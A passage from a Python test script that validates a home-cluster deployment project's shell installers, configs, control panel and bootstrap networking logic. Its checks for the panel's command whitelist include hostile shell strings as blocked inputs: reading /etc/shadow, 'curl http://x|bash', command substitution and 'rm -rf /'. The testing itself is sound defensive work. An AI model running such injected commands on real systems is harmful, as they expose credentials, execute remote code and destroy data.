        if 'dirname' in content:
            log_pass("动态计算路径（使用 dirname）")
        else:
            log_warn("可能使用硬编码路径")
        
        # 检查是否有硬编码路径
        hardcoded_patterns = [
            r'/mnt/sd/edge-01/panel',
            r'/mnt/sd/wk-edge/panel',
            r'/opt/onecloud/panel',
        ]
        has_hardcoded = False
        for pattern in hardcoded_patterns:
            if re.search(pattern, content):
                has_hardcoded = True
                log_fail(f"存在硬编码路径匹配: {pattern}")
        
        if not has_hardcoded:
            log_pass("未发现硬编码路径")
        
        # 检查可移植性
        if 'NODE_NAME=' in content:
            log_pass("有 NODE_NAME 变量")
        
        if 'NODE_NAME:-wk-edge-01' in content:
            log_pass("NODE_NAME 支持默认值")
        
        # 检查 systemd 服务文件生成
        if 'systemd/system' in content:
            log_pass("生成 systemd 服务文件")
        
        if 'ExecStart' in content:
            log_pass("服务有 ExecStart 配置")
        
        if 'WorkingDirectory' in content:
            log_pass("服务有 WorkingDirectory 配置")
    
    except Exception as e:
        log_fail(f"panel/install-service.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试11: 节点服务与 services.yaml 一致性 ============
def test_service_consistency():
    """验证节点服务配置一致性"""
    print("\n" + "="*60)
    print("测试 11: 节点服务配置一致性验证")
    print("="*60)
    
    try:
        # 读取 services.yaml
        with open(INVENTORY_DIR / "services.yaml", encoding='utf-8') as f:
            services_text = f.read()
        services_data = simple_yaml_parse(services_text)
        
        # 读取 panel config.json
        with open(PANEL_DIR / "config.json", encoding='utf-8') as f:
            panel_data = json.load(f)
        
        # 交叉验证
        log_info("交叉验证 services.yaml 与 panel/config.json:")
        
        yaml_services = services_data.get("services", {})
        panel_services = {}
        
        for node in panel_data.get("nodes", []):
            node_name = node["name"]
            svc_names = {s["name"] for s in node.get("services", [])}
            panel_services[node_name] = svc_names
        
        for node_name, panel_svcs in panel_services.items():
            yaml_node_svcs = {
                name for name, config in yaml_services.items()
                if config.get("node") == node_name
            }
            
            missing_in_panel = yaml_node_svcs - panel_svcs
            extra_in_panel = panel_svcs - yaml_node_svcs
            
            if not missing_in_panel and not extra_in_panel:
                log_pass(f"节点 {node_name}: services.yaml 与 panel 一致")
            else:
                if missing_in_panel:
                    log_warn(f"节点 {node_name}: panel 缺少服务 {missing_in_panel}")
                if extra_in_panel:
                    log_warn(f"节点 {node_name}: panel 多出服务 {extra_in_panel}")
        
        # 验证端口配置
        log_info("验证服务端口配置:")
        for svc_name, svc_config in yaml_services.items():
            if svc_config.get("container"):
                ports = svc_config.get("ports", [])
                for port_entry in ports:
                    port = port_entry.split(":")[0] if ":" in port_entry else port_entry
                    log_info(f"  {svc_name}: 端口 {port}")
    
    except Exception as e:
        log_fail(f"服务一致性验证错误: {str(e)}")
        return False
    
    return True

# ============ 测试12: 生成测试报告 ============
def generate_report():
    """生成测试报告"""
    print("\n" + "="*60)
    print("测试报告")
    print("="*60)
    
    total = PASSED + FAILED + WARNINGS
    
    print(f"\n  总计: {total} 项")
    print(color(f"  通过: {PASSED}", GREEN))
    print(color(f"  失败: {FAILED}", RED))
    print(color(f"  警告: {WARNINGS}", YELLOW))
    
    if FAILED == 0:
        print(f"\n  {color('[OK] 所有关键测试通过！', GREEN)}")
    else:
        print(f"\n  {color(f'[FAIL] 有 {FAILED} 项测试失败，需要修复', RED)}")
    
    # 显示所有警告
    warnings = [(name, detail) for status, name, detail in TEST_RESULTS if status == "WARN"]
    if warnings:
        print(f"\n  警告列表 ({len(warnings)} 项):")
        for name, detail in warnings:
            print(f"    - {name}")
            if detail:
                print(f"      {detail}")
    
    # 显示所有失败
    failures = [(name, detail) for status, name, detail in TEST_RESULTS if status == "FAIL"]
    if failures:
        print(f"\n  失败列表 ({len(failures)} 项):")
        for name, detail in failures:
            print(f"    - {name}")
            if detail:
                print(f"      {detail}")
    
    # 保存报告
    report_file = PROJECT_ROOT / "test_report.txt"
    with open(report_file, "w", encoding="utf-8") as f:
        f.write("OneCloud Cluster 验证报告\n")
        f.write("=" * 60 + "\n")
        f.write(f"通过: {PASSED}\n")
        f.write(f"失败: {FAILED}\n")
        f.write(f"警告: {WARNINGS}\n")
        f.write(f"总计: {total}\n\n")
        
        f.write("详细结果:\n")
        f.write("-" * 60 + "\n")
        for status, name, detail in TEST_RESULTS:
            f.write(f"[{status}] {name}")
            if detail:
                f.write(f" - {detail}")
            f.write("\n")
    
    log_info(f"报告已保存到: {report_file}")
    
    return FAILED == 0

# ============ 测试12: 文档化 CLI 接口契约验证 ============
def test_cli_contract():
    """验证 README / 运维手册中记载的命令行接口确实被实现

    之前的验证只检查语法和字符串存在性, 导致"文档写了但脚本没实现"
    的问题无法被发现 (例如 deploy.sh --exec、wireguard-setup.sh add peer)。
    本测试专门守住这些契约。
    """
    print("\n" + "="*60)
    print("测试 12: 文档化 CLI 接口契约验证")
    print("="*60)

    def read(path):
        p = Path(path)
        return p.read_text(encoding="utf-8", errors="ignore") if p.exists() else ""

    # ---- bootstrap.sh: --node/--ip/--hostname/--sd/--yes ----
    boot = read(SCRIPTS_DIR / "bootstrap.sh")
    for opt in ("--node", "--ip", "--hostname", "--sd", "--yes"):
        if re.search(rf'^\s*-[a-zA-Z\|]*{re.escape(opt.lstrip("-")[0])}\|--?{re.escape(opt.lstrip("-"))}\b', boot, re.M) or opt in boot:
            log_pass(f"bootstrap.sh 支持 {opt}")
        else:
            log_fail(f"bootstrap.sh 缺少 {opt}", "README 记载的初始化用法会失效")

    # ---- deploy.sh ----
    dep = read(SCRIPTS_DIR / "deploy.sh")
    for opt in ("--exec", "--node", "--test", "--dry-run"):
        if opt in dep:
            log_pass(f"deploy.sh 支持 {opt}")
        else:
            log_fail(f"deploy.sh 缺少 {opt}", f"README 记载的 {opt} 会报'未知选项'")

    # -n 必须按节点表查找, 而不是把参数直接当 NAME|IP|ROLE 记录解析
    if "node_selected" in dep:
        log_pass("deploy.sh -n 按节点表解析节点名")
    else:
        log_fail("deploy.sh -n 未做节点名映射", "-n wk-edge-01 会解析出空 IP")

    # ---- wireguard-setup.sh ----
    wg = read(SCRIPTS_DIR / "wireguard-setup.sh")
    if "cmd_add_peer" in wg and re.search(r'^\s*peer\)', wg, re.M):
        log_pass("wireguard-setup.sh 实现 'add peer' 子命令")
    else:
        log_fail("wireguard-setup.sh 缺少 'add peer'", "运维手册 5.2 的用法不可用")
    if re.search(r'^\s*list\|ls\)', wg, re.M):
        log_pass("wireguard-setup.sh 实现 'list' 子命令")
    else:
        log_fail("wireguard-setup.sh 缺少 'list'")
    # 产物必须落到 deploy.sh 能分发的 node-<name>/wireguard/
    if "node-${name}/wireguard/wg0.conf" in wg:
        log_pass("wireguard-setup.sh 输出到 node-<name>/wireguard/wg0.conf")
    else:
        log_fail("wireguard-setup.sh 输出目录与 deploy.sh 分发路径不一致")

    # ---- restore.sh: 支持 <备份ID> <节点名或服务名> 简写 ----
    rst = read(SCRIPTS_DIR / "restore.sh")
    if "RESTORE_TARGET" in rst and "无法识别的恢复目标" in rst:
        log_pass("restore.sh 支持 <备份ID> <目标> 简写形式")
    else:
        log_fail("restore.sh 不支持简写形式", "运维手册 3.3 的用法会落到 usage")
    if "normalize_node" in rst:
        log_pass("restore.sh 支持节点简写 (edge-01 -> wk-edge-01)")
    else:
        log_fail("restore.sh 未做节点名归一化")

    # ---- update-all.sh: 必须过滤 apt list 的 "Listing..." 表头 ----
    upd = read(SCRIPTS_DIR / "update-all.sh")
    if "upgradable from" in upd and ("awk -F'/'" in upd or "NF>1" in upd):
        log_pass("update-all.sh 过滤 apt list 表头")
    else:
        log_fail("update-all.sh 会把 'Listing... Done' 当包名传给 apt upgrade")

    # ---- install-services.sh: PEP 668 兼容 ----
    ins = read(SCRIPTS_DIR / "install-services.sh")
    if "--break-system-packages" in ins:
        log_pass("install-services.sh 兼容 PEP 668 (externally-managed)")
    else:
        log_fail("install-services.sh 在 Debian 12+ 上 pip3 安装会失败")

    # ---- generate-keys.sh: PostUp/PostDown 各只能有一条 ----
    gk = read(NODE_DIRS["wk-edge-01"] / "wireguard" / "generate-keys.sh")
    n_up = len([l for l in gk.splitlines() if l.strip().startswith("PostUp")])
    n_down = len([l for l in gk.splitlines() if l.strip().startswith("PostDown")])
    if n_up <= 1 and n_down <= 1:
        log_pass(f"generate-keys.sh PostUp/PostDown 各 {n_up}/{n_down} 条 (无覆盖)")
    else:
        log_fail(
            f"generate-keys.sh PostUp/PostDown 重复 ({n_up}/{n_down})",
            "wg-quick 只保留最后一条, NAT 规则会被静默丢弃"
        )

    # ---- services.yaml: 不得同时声明 ports 与 network_mode: host ----
    svc_text = read(INVENTORY_DIR / "services.yaml")
    blocks = re.split(r'\n(?=  [a-z0-9_-]+:\s*$)', svc_text)
    conflict_found = False
    for b in blocks:
        m = re.match(r'\s{2}([a-z0-9_-]+):', b)
        if not m:
            continue
        name = m.group(1)
        has_ports = re.search(r'^\s{4}ports:\s*$', b, re.M) is not None
        has_host = re.search(r'^\s{4}network_mode:\s*host\s*$', b, re.M) is not None
        if has_ports and has_host:
            log_fail(f"services.yaml: {name} 同时声明 ports 与 network_mode: host", "docker compose 会拒绝")
            conflict_found = True
    if not conflict_found:
        log_pass("services.yaml 无 ports/network_mode 冲突")

    log_info("CLI 契约检查完成")


# ============ 测试13: 节点 IP 可自定义 / 主机名齐全 ============
def test_ip_customizable():
    """验证: 节点 IP 全部来自清单 (可自定义), 每个节点都有 hostname, 脚本无硬编码旧文档 IP"""
    print("\n" + "="*60)
    print("测试 13: 节点 IP 自定义与主机名完整性")
    print("="*60)

    # 1) 每个节点必须有 hostname (带默认值) 与 ip
    try:
        with open(INVENTORY_DIR / "nodes.yaml", encoding='utf-8') as f:
            nodes_data = simple_yaml_parse(f.read())
        nodes = nodes_data.get("nodes", [])
        if not nodes:
            log_fail("nodes.yaml 未解析出节点")
        for node in nodes:
            name = node.get("name", "?")
            if not node.get("hostname"):
                log_fail(f"节点 {name} 缺少 hostname 字段 (每个节点都必须设定 hostname)")
            else:
                log_pass(f"节点 {name} 主机名: {node['hostname']} (可自定义)")
            if not node.get("ip"):
                log_fail(f"节点 {name} 缺少 ip 字段")
            else:
                log_pass(f"节点 {name} IP: {node['ip']} (来自清单, 可覆盖)")
    except Exception as e:
        log_fail(f"解析 nodes.yaml 失败: {str(e)}")

    # 2) 核心功能脚本不得硬编码旧文档里的 192.168.1.10x / 10.8.0.10x
    core_scripts = [
        "deploy.sh", "update-all.sh", "health-check.sh", "backup.sh",
        "restore.sh", "bootstrap.sh", "setup.sh", "install-services.sh",
        "wireguard-setup.sh",
    ]
    import subprocess
    for script in core_scripts:
        path = SCRIPTS_DIR / script
        if not path.exists():
            continue
        content = path.read_text(encoding='utf-8')
        # 去掉注释行后再查 (避免 help/示例注释误报)
        code_lines = [
            ln for ln in content.splitlines()
            if not ln.strip().startswith("#")
        ]
        code = "\n".join(code_lines)
        hits = re.findall(r'(?:192\.168\.1\.10[0-9]|10\.8\.0\.10[0-9])', code)
        if hits:
            log_fail(f"{script} 仍硬编码旧 IP: {sorted(set(hits))}",
                     "节点 IP 应从 inventory/nodes.yaml 读取, 以支持自定义网络")
        else:
            log_pass(f"{script} 无硬编码节点 IP (IP 全部来自清单)")

    # 4) 节点 .env 生成器可用 (把自定义 IP 贯通到容器运行时)
    if (SCRIPTS_DIR / "gen-node-env.sh").exists():
        r = subprocess.run(["bash", str(SCRIPTS_DIR / "gen-node-env.sh"), "--dry-run"],
                           capture_output=True, text=True, cwd=str(PROJECT_ROOT))
        if r.returncode == 0 and "NODE_IP=" in r.stdout:
            log_pass("gen-node-env.sh 可渲染节点 .env (自定义 IP 贯通到容器)")
        else:
            log_fail("gen-node-env.sh 渲染失败", r.stderr[:120])
    else:
        log_fail("缺少 scripts/gen-node-env.sh")


def test_safety_regression():
    """测试 14: 安全与健壮性回归 (已修缺陷不得复现)"""
    print("\n" + "="*60)
    print("测试 14: 安全与健壮性回归")
    print("="*60)

    # 1) restore.sh: 'latest' 且无备份时必须报错, 不能退化成备份根目录
    restore = SCRIPTS_DIR / "restore.sh"
    if restore.exists():
        src = restore.read_text(encoding="utf-8")
        if 'BACKUP_ID" = "latest"' in src and "没有可用备份" in src:
            log_pass("restore.sh 对 latest 无备份场景有守卫")
        else:
            log_fail("restore.sh 缺少 latest 空备份守卫",
                     "否则 BACKUP_PATH 会退化成备份根目录, 误恢复整个备份目录")

    # 2) 原生安装器: 下载产物须校验 + root 检查
    inst = SCRIPTS_DIR / "install-services.sh"
    if inst.exists():
        src = inst.read_text(encoding="utf-8")
        if "is_elf_binary" in src:
            log_pass("install-services.sh 校验下载产物为可执行文件")
        else:
            log_fail("install-services.sh 未校验下载产物", "404 页面可能被当成安装成功")
        if "require_root" in src:
            log_pass("install-services.sh 对原生安装有 root 权限检查")
        else:
            log_fail("install-services.sh 缺少 root 权限检查")

    # 3) setup.sh: 二进制下载同样需要校验
    setup = SCRIPTS_DIR / "setup.sh"
    if setup.exists():
        src = setup.read_text(encoding="utf-8")
        if "is_elf_binary" in src:
            log_pass("setup.sh 校验二进制下载产物")
        else:
            log_fail("setup.sh 未校验二进制下载产物")

    # 4) 节点内重复安装器应委派到统一脚本, 不得各自实现
    dup = {
        "node-wk-edge-01/clash/install-binary.sh": "mihomo",
        "node-wk-iot-02/xiaomusic/install.sh": "xiaomusic",
    }
    for rel, target in dup.items():
        p = PROJECT_ROOT / rel
        if not p.exists():
            continue
        src = p.read_text(encoding="utf-8")
        if "install-services.sh" in src and target in src:
            log_pass(f"{rel} 已委派统一安装脚本 (无重复实现)")
        else:
            log_fail(f"{rel} 仍在重复实现安装逻辑", "易与 install-services.sh 产生行为分叉")

    # 5) 面板命令白名单: 必须拦住 shell 元字符 (前缀匹配可被 'cmd; evil' 绕过)
    app = PANEL_DIR / "app.py"
    if app.exists():
        try:
            src = app.read_text(encoding="utf-8")
            seg = src[src.index("ALLOWED_CMD_PREFIXES"):src.index("def load_config")]
            ns = {}
            exec(seg, ns)
            safe = ns["is_command_safe"]
            must_pass = ["free -h", "df -h", "docker ps", "uptime", "cat /proc/loadavg"]
            must_block = ["free; cat /etc/shadow", "uptime && curl http://x|bash",
                          "ls `whoami`", "date $(id)", "rm -rf /"]
            bad = [c for c in must_pass if not safe(c)] + [c for c in must_block if safe(c)]
            if not bad:
                log_pass("面板命令白名单: 正常命令放行, 元字符与危险命令被拦截")
            else:
                log_fail(f"面板命令白名单判定异常: {bad}")
        except Exception as e:
            log_fail(f"面板白名单校验失败: {e}")


def test_panel_frontend_contract():
    """测试 15: 面板前端与后端契约 (前端调用必须真实存在, 且方法/参数匹配)"""
    print("\n" + "="*60)
    print("测试 15: 面板前端与后端契约")
    print("="*60)

    js = PANEL_DIR / "static" / "js" / "app.js"
    app = PANEL_DIR / "app.py"
    if not js.exists() or not app.exists():
        log_fail("面板前端或后端文件缺失")
        return

    js_src = js.read_text(encoding="utf-8")
    py_src = app.read_text(encoding="utf-8")

    # 1) 前端引用的 API 端点必须在后端有定义
    endpoints = sorted(set(re.findall(r'fetch\(\s*[`"\'](/api/[a-zA-Z_/]*)', js_src)))
    missing = [ep for ep in endpoints if ep.rstrip("/") not in py_src]
    if missing:
        log_fail(f"前端调用了后端不存在的接口: {missing}")
    else:
        log_pass(f"前端引用的 {len(endpoints)} 个 API 端点后端均已定义")

    # 2) 服务操作必须是 POST (后端 methods=["POST"], 用 GET 会 405)
    sidx = js_src.find("async function serviceAction")
    sbody = js_src[sidx:js_src.find("async function nodeAction")] if sidx >= 0 else ""
    if 'method: "POST"' in sbody:
        log_pass('serviceAction 使用 POST (与后端 methods=["POST"] 匹配)')
    else:
        log_fail("serviceAction 未使用 POST", "后端只接受 POST, 否则启停/重启/日志全部 405")

    # 3) 集群 docker_* 操作必须真正下发请求, 不能只弹提示
    cidx = js_src.find("async function clusterAction")
    cbody = js_src[cidx:js_src.find("async function execCmd")] if cidx >= 0 else ""
    if "/api/node/" in cbody and "JSON.stringify({action})" in cbody:
        log_pass("集群 docker_up/down/pull 会对各节点真实下发请求")
    else:
        log_fail("集群批量操作只弹提示未调用 API", "按钮点了没有任何实际效果")

    # 4) 日志操作必须把内容展示出来, 而不是只提示成功
    if '"logs"' in sbody and "execOutput" in sbody:
        log_pass("服务日志操作会输出日志内容 (而非只提示成功)")
    else:
        log_fail("日志操作未展示输出", "点击日志按钮看不到任何内容")

    # 5) 白名单必须允许裸 ls (曾写成 'ls ' 带尾空格, 导致 ls 被拒)
    try:
        seg = py_src[py_src.index("ALLOWED_CMD_PREFIXES"):py_src.index("def load_config")]
        ns = {}
        exec(seg, ns)
        safe = ns["is_command_safe"]
        if safe("ls") and safe("ls /mnt/sd") and not safe("ls && rm -rf /"):
            log_pass("命令白名单允许裸 ls 且仍拦截拼接命令")
        else:
            log_fail("白名单对 ls 的判定不符合预期")
    except Exception as e:
        log_fail(f"白名单 ls 校验失败: {e}")


def test_bootstrap_network_resolution():
    """测试 16: bootstrap 网络取值 (IP/网关联动 + 本机探测 + 来源标注)"""
    print("\n" + "=" * 60)
    print("测试 16: bootstrap 网络取值与网关联动")
    print("=" * 60)

    boot = PROJECT_ROOT / "scripts" / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")

    def run_boot(args, env_extra=None):
        env = dict(os.environ)
        env["ONECLOUD_BOOTSTRAP_TTY"] = "0"   # 强制非交互, 避免测试环境差异
        if env_extra:
            env.update(env_extra)
        return subprocess.run(
            ["bash", str(boot)] + args,
            capture_output=True, text=True, encoding="utf-8",
            errors="replace", env=env, cwd=str(boot.parent),
            stdin=subprocess.DEVNULL,
        )

    def parse_net(out):
        ip_m = re.search(r"静态IP:\s+(\S+)\s+\(来源:\s*([^)]+)\)", out)
        gw_m = re.search(r"网关:\s+(\S+)\s+\(来源:\s*([^)]+)\)", out)
        return (ip_m.groups() if ip_m else None, gw_m.groups() if gw_m else None)

    # 1) 网段推导函数: 由 IP+前缀 得到 "<网络地址> <网关>"
    cases = [("192.168.6.101", "24", "192.168.6.0 192.168.6.1"),
             ("10.0.0.5", "8", "10.0.0.0 10.0.0.1"),
             ("172.16.5.9", "16", "172.16.0.0 172.16.0.1")]
    bad = []
    for ip, prefix, expect in cases:
        r = subprocess.run(
            ["bash", "-c",
             'source <(sed -n "/^ip_net_info()/,/^}/p" "$1"); ip_net_info ' + ip + " " + prefix,
             "_", str(boot)],
            capture_output=True, text=True, encoding="utf-8", errors="replace")
        if r.stdout.strip() != expect:
            bad.append(f"{ip}/{prefix} -> {r.stdout.strip()!r}")
    if bad:
        log_fail(f"网段推导结果错误: {'; '.join(bad)}")
    else:
        log_pass("网段推导函数正确 (/24 /8 /16 均得到网络地址+1 的网关)")

    # 2) 传 --ip 换网段: 网关必须跟着变, 不能停留在清单默认值
    r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.6.101",
                  "--hostname", "edge-01", "--dry-run"])
    (ip_val, ip_src), (gw_val, gw_src) = parse_net(r.stdout)
    if gw_val == "192.168.6.1" and "推导" in (gw_src or ""):
        log_pass("--ip 换网段后网关自动跟随 (192.168.1.1 -> 192.168.6.1)")
    else:
        log_fail(f"--ip 换网段后网关未跟随: 网关={gw_val} 来源={gw_src}",
                 "换网段后网关仍是清单默认值会导致配置完无法联网")

    # 3) 显式 --gateway 不被推导覆盖
    r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.6.101",
                  "--gateway", "192.168.6.254", "--dry-run"])
    _, (gw_val, gw_src) = parse_net(r.stdout)
    if gw_val == "192.168.6.254" and "命令行" in (gw_src or ""):
        log_pass("显式 --gateway 不被自动推导覆盖 (尊重明确意图)")
    else:
        log_fail(f"显式 --gateway 被覆盖: {gw_val} ({gw_src})")

    # 4) 未换网段时保留清单网关 (不能瞎改)
    r = run_boot(["--node", "wk-edge-01", "--dry-run"])
    _, (gw_val, gw_src) = parse_net(r.stdout)
    if gw_val == "192.168.1.1" and "清单" in (gw_src or ""):
        log_pass("IP 未变更时网关保持清单值 (192.168.1.1)")
    else:
        log_fail(f"IP 未变更时网关异常: {gw_val} ({gw_src})")

    # 5) 本机探测能力 + 可关闭
    has_detect = "detect_current_network()" in src and "--no-detect" in src
    has_dry = "--dry-run" in src
    if has_detect and has_dry:
        log_pass("具备本机网络探测 (--no-detect 可关闭) 与 --dry-run 预览")
    else:
        missing = [n for n, ok in [("detect_current_network", "detect_current_network()" in src),
                                   ("--no-detect", "--no-detect" in src),
                                   ("--dry-run", has_dry)] if not ok]
        log_fail(f"缺少: {missing}")

    # 6) 配置确认页必须标注取值来源
    if "来源: ${IP_SOURCE}" in src and "来源: ${GW_SOURCE}" in src:
        log_pass("配置确认页标注了 IP/网关的取值来源")
    else:
        log_fail("配置确认页未标注来源", "用户无法判断值来自命令行、探测还是清单")

    # 7) 文档同步: README 需说明优先级与网关联动
    readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    if "由最终 IP 推导" in readme and "自动探测当前设备" in readme:
        log_pass("README 已记录 IP/网关取值优先级与探测行为")
    else:
        log_fail("README 未说明新的取值规则", "文档与实际行为会漂移")


def test_bootstrap_sd_and_risk():
    """测试 17: bootstrap 启动探测 / SD 卡决策 / 写入前网络风险提示"""
    print("\n" + "=" * 60)
    print("测试 17: bootstrap SD 卡决策与网络风险提示")
    print("=" * 60)

    boot = PROJECT_ROOT / "scripts" / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")

    # 1) 探测必须发生在参数解析之前 (否则无法用于后续比对)
    i_detect = src.find("detect_current_network\n")
    i_args = src.find("while [[ $# -gt 0 ]]")
    if 0 <= i_detect < i_args:
        log_pass("启动即探测本机 IP/网关 (早于参数解析)")
    else:
        log_fail("本机探测未放在参数解析之前", "后续网段比对会拿不到当前网络")

    # 2) SD 探测函数与"无卡跳过"路径存在
    needed = ["detect_sd_cards()", "未检测到 SD 卡", "SD_CANDIDATES"]
    missing = [n for n in needed if n not in src]
    if not missing:
        log_pass("具备 SD 卡探测与无卡跳过逻辑")
    else:
        log_fail(f"缺少 SD 卡处理: {missing}")

    # ---- 用 mock 环境做行为验证 ----
    # 注意: Git Bash 的 PATH 查找只认 POSIX 路径 (/c/...), 不认 C:/...
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t17_"))
    probe = SCRIPTS_DIR / "_probe_t17.sh"
    harness = tmpdir / "harness.sh"

    harness.write_text(f"""#!/bin/bash
set -u
BOOT="{_posix(boot)}"
PROBE="{_posix(probe)}"
M="{_posix(tmpdir)}/mockbin"
mkdir -p "$M"

cat > "$M/ip" << 'MOCKEOF'
#!/bin/bash
if [ "$1" = "-4" ] && [ "$2" = "-o" ]; then
    echo "2: eth0    inet 192.168.6.50/24 brd 192.168.6.255 scope global eth0"
    exit 0
fi
if [ "$1" = "route" ]; then
    echo "default via 192.168.6.1 dev eth0 proto dhcp src 192.168.6.50 metric 100"
    exit 0
fi
exit 0
MOCKEOF

cat > "$M/findmnt" << 'MOCKEOF'
#!/bin/bash
echo "/dev/mmcblk0p1"
MOCKEOF

cat > "$M/lsblk" << 'MOCKEOF'
#!/bin/bash
echo "mmcblk0  0 disk"
[ "${{MOCK_NO_SD:-0}}" = "1" ] || echo "mmcblk1  1 disk"
exit 0
MOCKEOF

cat > "$M/ping" << 'MOCKEOF'
#!/bin/bash
t="${{@: -1}}"
case "${{MOCK_PING_MODE:-gw}}" in
    all)  exit 0 ;;
    none) exit 1 ;;
    gw)   [ "$t" = "192.168.6.1" ] && exit 0 || exit 1 ;;
esac
MOCKEOF
chmod +x "$M"/*

# 截取到"设置主机名"之前: 只跑参数/探测/SD决策/风险提示, 绝不改动系统
LN=$(grep -n '^# ---- 2\\. 设置主机名 ----' "$BOOT" | cut -d: -f1)
sed -n "1,${{LN}}p" "$BOOT" > "$PROBE"

run() {{
    local tag="$1" nose="$2" ping="$3"
    shift 3
    echo "###CASE:$tag"
    ( cd "$(dirname "$PROBE")" \\
      && MOCK_NO_SD="$nose" MOCK_PING_MODE="$ping" PATH="$M:$PATH" \\
         bash "$(basename "$PROBE")" "$@" </dev/null 2>&1 )
}}

run sd_no_card 1 gw --node wk-edge-01 --ip 192.168.6.101 --dry-run
run sd_present 0 gw --node wk-edge-01 --ip 192.168.6.101 --dry-run
run sd_disabled 0 gw --node wk-edge-01 --ip 192.168.6.101 --no-sd --dry-run
run sd_noauto 0 gw --node wk-edge-01 --ip 192.168.6.101 --no-sd-automount --dry-run
run cross_seg 0 gw --node wk-edge-01 --ip 10.0.0.9 --dry-run
run ip_clash 0 all --node wk-edge-01 --ip 192.168.6.101 --dry-run
run nodetect 0 gw --node wk-edge-01 --ip 10.0.0.9 --no-detect --dry-run
""", encoding="utf-8")

    try:
        r = subprocess.run(["bash", str(harness)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=HARNESS_TIMEOUT)
        out = r.stdout

        def case(tag):
            m = re.search(rf"###CASE:{tag}\n(.*?)(?=\n###CASE:|\Z)", out, re.S)
            return m.group(1) if m else ""

        c = case("sd_no_card")
        if "未检测到 SD 卡" in c and "将跳过" in c and "将迁移" not in c:
            log_pass("未插卡时跳过 SD 挂载与 Docker 迁移")
        else:
            log_fail("未插卡仍执行了 SD 相关步骤", c[:200])

        c = case("sd_present")
        if "将挂载" in c and "将迁移" in c and "/mnt/sd/docker" in c:
            log_pass("检测到 SD 卡后展示挂载与 Docker 迁移计划")
        else:
            log_fail("有卡时未展示挂载计划", c[:200])

        c = case("sd_disabled")
        if "已指定 --no-sd" in c and "将跳过" in c:
            log_pass("--no-sd 完全跳过 SD 相关步骤")
        else:
            log_fail("--no-sd 未生效", c[:200])

        c = case("sd_noauto")
        if "不写入 fstab" in c and "(自动挂载: 否)" in c:
            log_pass("--no-sd-automount 挂载但不写 fstab")
        else:
            log_fail("--no-sd-automount 未生效", c[:200])

        c = case("cross_seg")
        if "不在同一网段" in c and "风险" in c:
            log_pass("新 IP 与当前 IP 跨网段时告警")
        else:
            log_fail("跨网段未告警", "配完静态 IP 可能直接失联")

        c = case("cross_seg")
        if "不可达" in c:
            log_pass("网关 ping 不通时告警")
        else:
            log_fail("网关不可达未告警", c[:200])

        c = case("ip_clash")
        if "已被占用" in c:
            log_pass("目标 IP 已被占用时告警")
        else:
            log_fail("IP 冲突未告警", c[:200])

        c = case("nodetect")
        if "10.0.0.9" in c and "不在同一网段" in c:
            log_pass("--no-detect 仅停用自动采用, 仍做网段比对")
        else:
            log_fail("--no-detect 关闭了风险比对", c[:200])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
        if probe.exists():
            probe.unlink()

    # 3) --help 不应触发探测
    r = subprocess.run(["bash", str(boot), "--help"], capture_output=True, text=True,
                       encoding="utf-8", errors="replace", stdin=subprocess.DEVNULL)
    if "本机当前网络:" not in r.stdout:
        log_pass("--help 直接输出用法, 不触发探测")
    else:
        log_fail("--help 触发了探测", "只查用法却去扫网络/磁盘")

    # 4) 文档同步
    doc_a = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    doc_b = (SCRIPTS_DIR / "README.md").read_text(encoding="utf-8")
    ok_a = ("--no-sd" in doc_a) and ("SD 卡处理" in doc_a) and ("网络安全检查" in doc_a)
    ok_b = ("--no-sd" in doc_b) and ("启动即探测" in doc_b)
    if ok_a and ok_b:
        log_pass("README 与 scripts/README 已同步新参数与新行为")
    else:
        log_fail(f"文档未同步 (README={ok_a}, scripts/README={ok_b})",
                 "用户不知道有 --no-sd 等开关")


# ============ 测试18: init 交互式入口 ============
def test_init_entrypoint():
    """测试 18: init/ 交互式入口契约 (纯交互 / 无默认参数 / 菜单齐全 / 引用脚本存在)"""
    print("\n" + "="*60)
    print("测试 18: init 交互式入口")
    print("="*60)

    init_dir = PROJECT_ROOT / "init"
    entry = init_dir / "init.sh"
    init_readme = init_dir / "README.md"

    if not entry.exists():
        log_fail("init/init.sh 不存在", "缺少交互式初始化入口")
        return
    log_pass("init/init.sh 存在")

    src = entry.read_text(encoding="utf-8")

    # 1) 基本结构
    if src.startswith("#!/bin/bash"):
        log_pass("init.sh 有 bash shebang")
    else:
        log_fail("init.sh 缺少 bash shebang")

    if "set -u" in src:
        log_pass("init.sh 启用 set -u（未定义变量尽早暴露）")
    else:
        log_fail("init.sh 未启用 set -u")

    # 2) 语法检查
    bash = shutil.which("bash")
    if bash:
        r = subprocess.run([bash, "-n", str(entry)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace")
        if r.returncode == 0:
            log_pass("init.sh 通过 bash -n 语法检查")
        else:
            log_fail(f"init.sh 语法错误: {r.stderr.strip()[:200]}")
    else:
        log_warn("未找到 bash，跳过 init.sh 语法检查")

    # 3) 纯交互：拒绝命令行参数、不预置 --yes
    if re.search(r'\[\s*"\$#"\s*-gt\s*0\s*\]', src) and "不接受任何命令行参数" in src:
        log_pass("init.sh 显式拒绝命令行参数（纯交互）")
    else:
        log_fail("init.sh 未拒绝命令行参数", "纯交互约定要求传入参数即报错退出")

    # 只看可执行代码：注释里说明"不预置 --yes"是正常表述, 不算违规
    code = "\n".join(ln for ln in src.splitlines() if not ln.lstrip().startswith("#"))

    if "--yes" not in code:
        log_pass("init.sh 未预置 --yes 等默认参数")
    else:
        log_fail("init.sh 出现 --yes", "与「不采用任何默认参数」的约定冲突")

    if "[Y/n]" not in code and "[y/N]" not in code:
        log_pass("确认提问不提供回车默认值（必须显式输入 y/n）")
    else:
